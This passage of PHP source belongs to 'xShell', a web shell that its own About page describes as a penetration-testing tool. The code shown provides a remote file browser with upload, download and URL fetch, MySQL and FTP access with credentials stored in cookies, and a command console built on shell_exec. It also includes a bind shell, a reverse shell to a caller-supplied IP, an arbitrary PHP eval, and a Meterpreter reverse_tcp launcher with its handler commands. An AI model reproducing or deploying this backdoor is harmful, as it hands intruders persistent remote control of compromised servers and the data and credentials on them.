					echo '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="files" value="browse" /><input type="hidden" name="trackback" value="action=files&files=delete" /><input type="submit" value="Select a file to delete" /></form>';
				}
			}
			else if (@$_GET ['files'] == 'download')
			{
				define ('PAGE_TITLE', 'Download Files');
				if (isset ($_GET ['edit']))
				{
					$content = file_get_contents ($_GET ['edit']);
					header('Content-disposition: attachment; filename=' . get_file_from_path ($_GET ['edit']));
					echo $content;
					define ('NO_CONTENT', 1);
					die ();
				}
				else
				{
					echo '<form><input type="hidden" name="action" value="files" /><input type="hidden" name="files" value="browse" /><input type="hidden" name="trackback" value="action=files&files=download" /><input type="submit" value="Select a file to download" /></form>';
				}
			}
			else if (@$_GET ['files'] == 'upload')
			{
				define ('PAGE_TITLE', 'Upload File');
				if (isset ($_POST ['directory']))
				{
					if ($_FILES["file"]["error"] > 0)
					{
						echo '<span class="failure">Error uploading file!</span>';
					}
					else
					{
						move_uploaded_file($_FILES["file"]["tmp_name"], $_POST ['directory'] . DIRECTORY_SEPARATOR . $_FILES["file"]["name"]);
						echo '<span class="success">File saved as ' . $_POST ['directory'] . DIRECTORY_SEPARATOR . $_FILES["file"]["name"] . '!</span>';
					}
				}
				else
				{
					echo '<form method="POST" enctype="multipart/form-data"><input name="directory" style="width:100%;color: #DDDDDD;background-color: #222222;border:none;" value="' . CURRENT_PATH . '" /><br /><label for="file">File:</label>
	<input type="file" name="file" id="file" /><br /><p><input type="submit" value="Upload" style="float:right;" /></p></form>';
				}
			}
			else if (@$_GET ['files'] == 'get')
			{
				define ('PAGE_TITLE', 'Get File');
				if (isset ($_POST ['url']))
				{
					echo 'Downloading from ' . $_POST ['url'] . '... ';
					$content = get_remote_file ($_POST ['url']);
					if ($content === false)
					{
						echo '<span class="failure">Error downloading file!</span>';
					}
					else
					{
						$file = get_file_from_path ($_POST ['url']);
						if (file_put_contents ($file, $content) === false)
						{
							echo '<span class="failure">Error saving file!</span>';
						}
						else
						{
							echo '<span class="success">File saved as ' . $file . '!</span>';
						}
					}
				}
				else
				{
					echo '<form method="POST">URL: <input name="url" autocomplete="off" style="width:60%;color: #DDDDDD;background-color: #222222;border:none;" value="http://" /> <input type="submit" value="Get" /></form>';
				}
			}
		}
		
		/* *************************************************************************** */
		/*                              == Database ==                                 */
		/*  Connect to MySQL databases                                                 */
		/*  Connect - connect to a databasest                                          */
		/*  Query - execute queries on the databasext                                  */
		/*                                                                             */
		/* *************************************************************************** */
		
		if ($_GET ['action'] == 'database')
		{
			define ('PAGE_TITLE', 'Database');
			$page -> sidebar = array ('connect', 'query', 'browser', 'disconnect');
			if (@$_GET ['database'] == 'connect')
			{
				if (isset ($_COOKIE ['XSHELL_DB_USER']))
				{
					echo '<b>Connected to ' . $_COOKIE ['XSHELL_DB_USER'] . '@' . $_COOKIE ['XSHELL_DB_SERVER'] . '</b><br />';
					echo '<form><input type="hidden" name="action" value="database" /><input type="hidden" name="database" value="disconnect" /><input type="submit" value="Disconnect" style="float:right;" /></form>';
				}
				else if (!isset ($_POST ['server']))
				{
					echo '<b>Connect to a database</b>';
					echo '<form method="POST" autocomplete="off">Server: <input name="server" style="color: #DDDDDD;background-color: #222222;border:none;" value="localhost" /><br />Username: <input name="username" style="color: #DDDDDD;background-color: #222222;border:none;" value="root" /><br />Password: <input name="password" style="color: #DDDDDD;background-color: #222222;border:none;" value="pass" /><br /><input type="submit" value="Connect" style="float:right;" /></form>';
				}
				else
				{
					if (MYSQLI)
					{
						$db = new mysqli ($_POST ['server'], $_POST ['username'], $_POST ['password']);
						if ($db -> connect_error)
						{
							echo '<span class="failure">Could not connect!</span>';
						}
						else
						{
							setcookie ('XSHELL_DB_SERVER', $_POST ['server']);
							setcookie ('XSHELL_DB_USER', $_POST ['username']);
							setcookie ('XSHELL_DB_PASSWORD', $_POST ['password']);
							echo '<span class="success">Connected!</span>';
						}
					}
					else if (MYSQL)
					{
						/* TODO: Add MySQL-only support */
					}
					else
					{
						echo '<span class="failure">No DB extensions loaded!</span>';
					}
				}
			}
			else if (@$_GET ['database'] == 'query')
			{
				if (!isset ($_COOKIE ['XSHELL_DB_USER']))
				{
					die ('<span class="failure">Not connected!</span>');
				}
				
				if (isset ($_POST ['cmd']))
				{
					$db = new mysqli ($_COOKIE ['XSHELL_DB_SERVER'], $_COOKIE ['XSHELL_DB_USER'], $_COOKIE ['XSHELL_DB_PASSWORD']);
					$page -> cmd_buffer = $_POST ['cmd'];
					$result = $db -> query ($_POST ['cmd']);
					$output = '';
					$rows = array ();
					$maxlengths = array ();
					$column_names = array ();
					if ($result !== false && $result !== true)
					{
						$r = 0;
						while ($row = $result -> fetch_assoc ())
						{
							$rows [] = $row;
							$i = 0;
							foreach ($row as $column => $value)
							{
								if ($r == 0) {$column_names [$i] = $column;}
								$maxlengths [$column] = max (@$maxlengths [$column], strlen ($value), strlen ($column));
								$i ++;
							}
							$r ++;
						}
						foreach ($column_names as $i => $column)
						{
							$output .= '|' . str_repeat ('-', $maxlengths [$column] + 2);
						}
						$output .= "|\n";
						foreach ($column_names as $i => $column)
						{
							$output .= '| ' . $column . ' ' . str_repeat (' ', $maxlengths [$column] - strlen ($column));
						}
						$output .= "|\n";
						foreach ($column_names as $i => $column)
						{
							$output .= '|' . str_repeat ('-', $maxlengths [$column] + 2);
						}
						$output .= "|\n|";
						foreach ($rows as $row)
						{
							$i = 0;
							$output .= ' ';
							foreach ($row as $column => $value)
							{
								$len = strlen ($value);
								$max = $maxlengths [$column];
								$output .= $value . @str_repeat (' ', $max - $len) . ' | ';
								$i ++;
							}
							$output .= "\n|";
						}
						foreach ($column_names as $i => $column)
						{
							$output .= str_repeat ('-', $maxlengths [$column] + 2) . '|';
						}
						$_POST ['buffer'] .= $_POST ['cmd'] . "\n" . $output . "\n";
						if ($_POST ['cmd'] == 'clear' || $_POST ['cmd'] == 'cls')
						{
							$_POST ['buffer'] = '';
						}
					}
				}
				else
				{
					$_POST ['buffer'] = '';
				}
				$page -> onload = 'document.getElementById(\'cmd\').focus();';
				echo '<form method="POST" autocomplete="off"><textarea id="buffer" wrap="off" style="width: 100%; height: 75%;" name="buffer">' . $_POST ['buffer'] . '</textarea><br /><div>Query: <input autocomplete="off" name="cmd" id="cmd" style="width:60%;color: #DDDDDD;background-color: #222222;border:none;" /></div></form>';
			}
			
			else if (@$_GET ['database'] == 'browser')
			{
				if (!isset ($_COOKIE ['XSHELL_DB_USER']))
				{
					die ('<span class="failure">Not connected!</span>');
				}
				
				$db = new mysqli ($_COOKIE ['XSHELL_DB_SERVER'], $_COOKIE ['XSHELL_DB_USER'], $_COOKIE ['XSHELL_DB_PASSWORD']);
				if (!isset ($_GET ['db']))
				{
					/* Get databases */
					echo '<b>Databases</b><br />';
					$result = $db -> query ('SHOW DATABASES');
					while ($row = $result -> fetch_row ())
					{
						$databases [] = $row [0];
						echo '<a href="?action=database&database=browser&db=' . $row [0] . '" style="color:white;">' . $row [0] . '</a><br />';
					}
				}
				else if (isset ($_GET ['db']))
				{
					if (isset ($_GET ['table']))
					{
						$offset = 0;
						if (isset ($_GET ['offset'])) {$offset = (int) $_GET ['offset'];}
						echo '<center><a href="?action=database&database=browser&db=' . $_GET ['db'] . '&table=' . $_GET ['table'] . '&offset=' . max (0, $offset - 30) . '" style="color:white;">&lt;&lt;</a>&nbsp;&nbsp;<a href="?action=database&database=browser&db=' . $_GET ['db'] . '&table=' . $_GET ['table'] . '&offset=' . ($offset + 30) . '" style="color:white;">&gt;&gt;</a></center><br />';
						echo '<b>' . $_GET ['table'] . '</b><br />';
						$db -> select_db ($_GET ['db']);
						$result = $db -> query ('SELECT * FROM ' . $_GET ['table'] . ' LIMIT ' . $offset . ',30');
						$rows = 0;
						echo '<table>';
						while ($row = $result -> fetch_assoc ())
						{
							if ($rows == 0)
							{
								echo '<tr>';
								foreach ($row as $column => $value)
								{
									echo '<td>' . $column . '</td>';
								}
								echo '</tr>';
							}
							echo '<tr>';
							foreach ($row as $value)
							{
								echo '<td>' . htmlentities ($value) . '</td>';
							}
							echo '</tr>';
							$rows ++;
						}
						echo '</table>';
					}
					else
					{
						/* Get tables */
						echo '<b>Tables in ' . $_GET ['db'] . '</b><br />';
						$db -> select_db ($_GET ['db']);
						$result = $db -> query ('SHOW TABLES');
						while ($row = $result -> fetch_row ())
						{
							$databases [] = $row [0];
							echo '<a href="?action=database&database=browser&db=' . $_GET ['db'] . '&table=' . $row [0] . '" style="color:white;">' . $row [0] . '</a><br />';
						}
					}
				}
			}
			
			else if (@$_GET ['database'] == 'disconnect')
			{
				setcookie ('XSHELL_DB_SERVER', 0, time () - 3600);
				setcookie ('XSHELL_DB_USER', 0, time () - 3600);
				setcookie ('XSHELL_DB_PASSWORD', time () - 3600);
				echo '<span class="success">Disconnected!</span>';
			}
			
			else
			{
			}
		}
		
		/* *************************************************************************** */
		/*                                 == FTP ==                                   */
		/*  Connect to an FTP server                                                   */
		/*  Connect - connect to a server                                              */
		/*                                                                             */
		/*                                                                             */
		/* *************************************************************************** */
		
		if ($_GET ['action'] == 'ftp')
		{
			$page -> sidebar = array ('connect', 'browse', 'upload', 'disconnect');
			if (@$_GET ['ftp'] == 'connect')
			{
				define ('PAGE_TITLE', 'FTP');
				if (isset ($_COOKIE ['XSHELL_FTP_USER']))
				{
					echo '<b>Connected to ' . $_COOKIE ['XSHELL_FTP_USER'] . '@' . $_COOKIE ['XSHELL_FTP_SERVER'] . '</b><br />';
					echo '<form><input type="hidden" name="action" value="ftp" /><input type="hidden" name="ftp" value="disconnect" /><input type="submit" value="Disconnect" style="float:right;" /></form>';
				}
				else if (!isset ($_POST ['server']))
				{
					echo '<b>Connect to an FTP server</b>';
					echo '<form method="POST" autocomplete="off">Server: <input name="server" style="color: #DDDDDD;background-color: #222222;border:none;" value="' . FTP_SERVER . '" /><br />Username: <input name="username" style="color: #DDDDDD;background-color: #222222;border:none;" value="root" /><br />Password: <input name="password" style="color: #DDDDDD;background-color: #222222;border:none;" value="pass" /><br /><input type="submit" value="Connect" style="float:right;" /></form>';
				}
				else
				{
					$ftp = ftp_connect ($_POST ['server']);
					if (ftp_login ($ftp, $_POST ['username'], $_POST ['password']) === false)
					{
						echo '<span class="failure">Could not connect!</span>';
					}
					else
					{
						setcookie ('XSHELL_FTP_SERVER', $_POST ['server']);
						setcookie ('XSHELL_FTP_USER', $_POST ['username']);
						setcookie ('XSHELL_FTP_PASSWORD', $_POST ['password']);
						echo '<span class="success">Connected!</span>';
					}
				}
			}
			if (@$_GET ['ftp'] == 'browse')
			{
				define ('PAGE_TITLE', 'FTP Browser');
				$ftp = ftp_connect ($_COOKIE ['XSHELL_FTP_SERVER']);
				ftp_login ($ftp, $_COOKIE ['XSHELL_FTP_USER'], $_COOKIE ['XSHELL_FTP_PASSWORD']);
				if (!isset ($_GET ['browse']))
				{
					$_GET ['browse'] = ftp_pwd ($ftp);
				}
				$_GET ['browse'] = realpath ($_GET ['browse']);
				ftp_chdir ($ftp, $_GET ['browse']);
				echo 'Browsing ' . $_GET ['browse'] . '<br />';
				$files = ftp_nlist ($ftp, $_GET ['browse']);
				array_unshift ($files, $_GET ['browse'] . DIRECTORY_SEPARATOR . '.', $_GET ['browse'] . DIRECTORY_SEPARATOR . '..');
				echo '<table><tr><td width="50%">Name</td><td width="10%">Size</td><td width="10%"></td></tr>';
				foreach ($files as $file)
				{
					if (is_dir ($file) && !isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=ftp&ftp=browse&browse=' . $file . '">' . $file . '</td><td>.</td></tr>';}
					if (is_dir ($file) && isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=ftp&ftp=browse&browse=' . $file . '&trackback=' . urlencode ($_GET ['trackback']) . '">' . $file . '</td><td>.</td></tr>';}
					if (is_file ($file) && !isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?action=ftp&ftp=download&edit=' . $file . '">' . $file . '</td><td>' . ftp_size ($ftp, $file) . '</td><td><a style="color:red;" href="?action=ftp&ftp=delete&edit=' . $file . '">[ DEL ]</a></td></tr>';}
					if (is_file ($file) && isset ($_GET ['trackback'])) {echo '<tr><td><a style="color: white;" href="?' . $_GET ['trackback'] . '&edit=' . $file . '">' . $file . '</td><td>' . ftp_size ($ftp, $file) . '</td><td><a style="color:red;" href="?action=ftp&ftp=delete&edit=' . $file . '">[ DEL ]</a></td></tr>';}
				}
				echo '</table>';
			}
			else if (@$_GET ['ftp'] == 'delete')
			{
				define ('PAGE_TITLE', 'FTP Deletion');
				$ftp = ftp_connect ($_COOKIE ['XSHELL_FTP_SERVER']);
				ftp_login ($ftp, $_COOKIE ['XSHELL_FTP_USER'], $_COOKIE ['XSHELL_FTP_PASSWORD']);
				if (isset ($_GET ['edit']))
				{
					if (ftp_delete ($ftp, $_GET ['edit']) === false) {echo '<span class="failure">Could not delete!</span><br />';}
					else {echo '<span class="success">Deleted!</span><br />';}
				}
				else
				{
					echo '<form><input type="hidden" name="action" value="ftp" /><input type="hidden" name="ftp" value="browse" /><input type="hidden" name="trackback" value="action=ftp&ftp=delete" /><input type="submit" value="Select a file to delete" /></form>';
				}
			}
			else if (@$_GET ['ftp'] == 'download')
			{
				define ('PAGE_TITLE', 'Download Files');
				$ftp = ftp_connect ($_COOKIE ['XSHELL_FTP_SERVER']);
				ftp_login ($ftp, $_COOKIE ['XSHELL_FTP_USER'], $_COOKIE ['XSHELL_FTP_PASSWORD']);
				if (isset ($_GET ['edit']))
				{
					$file = md5 (time ());
					ftp_get ($ftp, $file, $_GET ['edit'], FTP_BINARY);
					$content = file_get_contents ($file);
					header('Content-disposition: attachment; filename=' . get_file_from_path ($_GET ['edit']));
					echo $content;
					define ('NO_CONTENT', 1);
					die ();
				}
				else
				{
					echo '<form><input type="hidden" name="action" value="ftp" /><input type="hidden" name="ftp" value="browse" /><input type="hidden" name="trackback" value="action=ftp&ftp=download" /><input type="submit" value="Select a file to download" /></form>';
				}
			}
			else if (@$_GET ['ftp'] == 'upload')
			{
				define ('PAGE_TITLE', 'Upload File');
				$ftp = ftp_connect ($_COOKIE ['XSHELL_FTP_SERVER']);
				ftp_login ($ftp, $_COOKIE ['XSHELL_FTP_USER'], $_COOKIE ['XSHELL_FTP_PASSWORD']);
				if (isset ($_POST ['directory']))
				{
					if ($_FILES["file"]["error"] > 0)
					{
						echo '<span class="failure">Error uploading file!</span>';
					}
					else
					{
						ftp_chdir ($ftp, $_POST ['directory']);
						//move_uploaded_file($_FILES["file"]["tmp_name"], $_POST ['directory'] . DIRECTORY_SEPARATOR . $_FILES["file"]["name"]);
						ftp_put ($ftp, $_POST ['directory'] . DIRECTORY_SEPARATOR . $_FILES["file"]["name"], $_FILES["file"]["tmp_name"], FTP_BINARY);
						echo '<span class="success">File saved as ' . $_POST ['directory'] . DIRECTORY_SEPARATOR . $_FILES["file"]["name"] . '!</span>';
					}
				}
				else
				{
					echo '<form method="POST" enctype="multipart/form-data"><input name="directory" style="width:100%;color: #DDDDDD;background-color: #222222;border:none;" value="' . ftp_pwd ($ftp) . '" /><br /><label for="file">File:</label>
	<input type="file" name="file" id="file" /><br /><p><input type="submit" value="Upload" style="float:right;" /></p></form>';
				}
			}
			else if (@$_GET ['ftp'] == 'disconnect')
			{
				define ('PAGE_TITLE', 'FTP');
				setcookie ('XSHELL_FTP_SERVER', 0, time () - 3600);
				setcookie ('XSHELL_FTP_USER', 0, time () - 3600);
				setcookie ('XSHELL_FTP_PASSWORD', time () - 3600);
				echo '<span class="success">Disconnected!</span>';
			}
			if (isset ($ftp)) {ftp_close ($ftp);}
		}
		
		if ($_GET ['action'] == 'shell')
		{
			$page -> sidebar = array ('shell', 'bind', 'reverse', 'php-eval', 'meterpreter');
			if (@$_GET ['shell'] == 'shell')
			{
				define ('PAGE_TITLE', 'Shell');
				if (isset ($_POST ['cmd']))
				{
					$page -> cmd_buffer = $_POST ['cmd'];
					$_POST ['buffer'] .= PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$ ' . $_POST ['cmd'] . "\n" . shell_exec ($_POST ['cmd']);
					if ($_POST ['cmd'] == 'clear' || $_POST ['cmd'] == 'cls')
					{
						$_POST ['buffer'] = '';
					}
				}
				else
				{
					$_POST ['buffer'] = '';
				}
				$page -> onload = 'document.getElementById(\'cmd\').focus();';
				echo '<form method="POST" autocomplete="off"><textarea id="buffer" style="width: 100%; height: 75%;" name="buffer">' . $_POST ['buffer'] . '</textarea><br /><div>' . PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$<input autocomplete="off" name="cmd" id="cmd" style="width:60%;color: #DDDDDD;background-color: #222222;border:none;" /></div></form>';
			}
			else if (@$_GET ['shell'] == 'bind')
			{
				define ('PAGE_TITLE', 'Binding Shell');
				if (isset ($_POST ['port']))
				{
					$port = (int) $_POST ['port'];
					/* Try binding though PHP */
					$sock = @socket_create_listen ($port);
					if ($sock == false)
					{
						/* Try other methods */
						echo '<span class="failure">Failed to bind through PHP...</span>';
					}
					else
					{
						$connected = true;
						while ($connected)
						{
							$connection = socket_accept ($sock);
							if ($connection === false) {usleep (100);}
							else if ($connection > 0)
							{
								$buffer = PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$ ';
								socket_write ($connection, $buffer);
								while ($connected)
								{
									$read = socket_read ($connection, 1024, PHP_NORMAL_READ);
									$read = str_replace (array ("\n", "\r"), "", $read);
									if ($read == 'quit' || $read == 'exit')
									{
										$connected = false;
									}
									else if ($read != '')
									{
										$buffer = shell_exec ($read) . PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$ ';
										socket_write ($connection, $buffer);
									}
								}
								socket_close ($connection);
							}
							else
							{
								echo '<span class="failure">Failed to accept socket (PHP)...</span>';
								$connected = false;
							}
						}
						socket_close ($sock);
						echo 'Connection closed';
					}
				}
				else
				{
					echo '<form method="POST" target="_blank">Port to bind on: <input name="port" /><input type="submit" value="Bind" /></form>';
				}
			}
			else if (@$_GET ['shell'] == 'reverse')
			{
				define ('PAGE_TITLE', 'Reverse Shell');
				if (isset ($_POST ['port']))
				{
					$port = (int) $_POST ['port'];
					$ip = $_POST ['ip'];
					$connection = socket_create (AF_INET, SOCK_STREAM, SOL_TCP);
					if ($connection !== false)
					{
						if (socket_connect ($connection, $ip, $port))
						{
							$connected = true;
							$buffer = PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$ ';
							socket_write ($connection, $buffer);
							while ($connected)
							{
								$read = socket_read ($connection, 1024, PHP_NORMAL_READ);
								$read = str_replace (array ("\n", "\r"), "", $read);
								if ($read == 'quit' || $read == 'exit')
								{
									echo '<span class="success">Connection closed</span>';
									$connected = false;
								}
								else if ($read != '')
								{
									$buffer = shell_exec ($read) . PHP_USER . '@' . POSIX_NODENAME . ':' . CURRENT_PATH . '$ ';
									socket_write ($connection, $buffer);
								}
							}
						}
						else
						{
							echo '<span class="failure">Could not connect!</span>';
						}
						socket_close ($connection);
					}
					else
					{
						echo '<span class="failure">Could not create socket!</span>';
					}
				}
				else
				{
					echo '<form method="POST" target="_blank">Port to connect to: <input name="port" /><br />IP to connect to: <input name="ip" value="' . CLIENT_IP . '" /><input type="submit" style="float:right;" value="Connect" /></form>';
				}
			}
			else if (@$_GET ['shell'] == 'php-eval')
			{
				define ('PAGE_TITLE', 'PHP eval () Shell');
				$buffer = '';
				if (isset ($_POST ['cmd']))
				{
					$page -> cmd_buffer = $_POST ['cmd'];
					eval ($_POST ['cmd']);
					$buffer = htmlentities (ob_get_clean ());
				}
				$page -> onload = 'document.getElementById(\'cmd\').focus();';
				echo '<form method="POST" autocomplete="off"><textarea style="width: 100%; height: 75%;" name="buffer">' . $buffer . '</textarea><br /><div><input autocomplete="off" name="cmd" id="cmd" style="width:100%; color: #DDDDDD;background-color: #222222;border:none;" /></div></form>';
			}
			else if (@$_GET ['shell'] == 'meterpreter')
			{
				define ('PAGE_TITLE', 'PHP Meterpreter');
				if (isset ($_POST ['ip']))
				{
					eval ('$ip="' . $_POST ['ip'] . '"; $port=' . $_POST ['port'] . '; ' . $php_code_meterpreter);
				}
				else
				{
					echo '<form method="POST" autocomplete="off" target="_blank"><b>IP: </b><input name="ip" value="' . CLIENT_IP . '" style="color: #DDDDDD;background-color: #222222;border:none;" /><br /><b>Port:</b> <input name="port" value="4444" style="color: #DDDDDD;background-color: #222222;border:none;" /><br /><input type="submit" value="Connect" /></form>';
					echo '<pre>msf > use multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST ' . CLIENT_IP . '
LHOST => ' . CLIENT_IP . '
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > exploit -z -j</pre>';
				}
			}
			else
			{
				define ('PAGE_TITLE', 'Shell');
				echo '<b>Shell</b><br />';
				echo '<p>The shell functions allow you to connect to this server and run commands directly on it</p>';
				echo '<p>There are four types;<br />';
				echo '<i>Shell</i> is a web-based console<br />';
				echo '<i>Bind</i> listens for telnet connections on the specified port<br />';
				echo '<i>Reverse</i> tries to open a telnet connection directly to the remote machine (you)<br />';
				echo '<i>PHP Eval</i> lets you run PHP commands directly from the web-based interface</p>';
				echo '<i>Meterpreter</i> runs a reverse_tcp meterpreter session through PHP';
			}
		}
		
		/* *************************************************************************** */
		/*                                ==  About  ==                                */
		/*  Print a pretty about page and deny all responsibility for damage caused!   */
		/*                                                                             */
		/* *************************************************************************** */
		
		if ($_GET ['action'] == 'about')
		{
			define ('PAGE_TITLE', 'About');
			echo '<h1>xShell</h1>';
			echo '<p>By <a href="http://www.quetuo.net/" style="color:white;" >Quetuo</a></p>';
			echo '<p>xShell is a powerful PHP-based web shell intended for use in network penetration testing. It can be used in anaylsing a system for vulnerabilies and is not intended for malicious purposes.</p>';
			echo '<p>You are responsible for your own actions; I hereby reject all responsibility for any illegal activities involving this tool</p>';
			echo '<p>Written for the folk at XtremeRoot!</p>';
		}
	die ();
	}
?>
       
